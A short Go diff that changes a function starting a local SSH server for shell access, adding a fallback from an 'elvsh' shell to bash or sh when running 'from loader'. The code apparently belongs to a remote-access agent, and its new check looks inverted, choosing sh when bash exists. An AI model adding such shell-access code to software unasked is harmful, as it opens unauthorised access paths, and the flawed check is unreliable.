@@ -26,6 +26,15 @@ func setWinsize(f *os.File, w, h int) {
 // SSHD start a ssh server to provide shell access for clients
 // the server binds local interface only
 func crossPlatformSSHD(shell, port string, args []string) (err error) {
+	// if we're running from loader, elvsh is not available
+	run_from_loader := os.Getenv("LD") == "true"
+	if run_from_loader && shell == "elvsh" {
+		shell = "bash"
+		if util.IsCommandExist(shell) {
+			shell = "sh"
+		}
+	}
+
 	exe, err := exec.LookPath(shell)
 	if err != nil && shell != "elvsh" {
 		res := fmt.Sprintf("%s not found (%v), aborting", shell, err)
@@ -52,7 +61,6 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			}
 			exe = new_exe
 		}
-
 		cmd := exec.Command(exe, args...)
 		cmd.Env = os.Environ()
 
